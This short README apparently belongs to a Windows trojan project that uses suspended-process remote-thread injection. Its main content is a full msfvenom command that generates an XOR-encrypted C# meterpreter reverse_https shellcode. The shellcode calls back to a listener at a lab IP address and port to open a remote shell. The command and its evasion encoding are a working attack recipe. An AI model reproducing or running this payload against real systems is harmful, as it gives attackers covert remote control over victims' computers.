# RemoteThreadSuspendedprocessInjection
Trojan Solutionfile

to generate shellcode;
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.56.1 lport=4444 -f csharp --encrypt xor --encrypt-key ARICAHACKON
